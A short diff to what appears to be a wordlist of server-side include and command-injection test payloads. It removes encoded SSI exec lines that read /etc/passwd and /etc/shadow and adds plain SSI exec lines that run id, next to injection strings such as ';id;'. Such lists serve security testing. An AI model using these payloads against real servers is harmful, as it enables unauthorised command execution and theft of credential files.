@@ -1,7 +1,5 @@
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+<!--#exec cmd="/usr/bin/id"-->
+<!--#exec cmd="id"-->
 /index.html|id|
 ;id;
 ;id
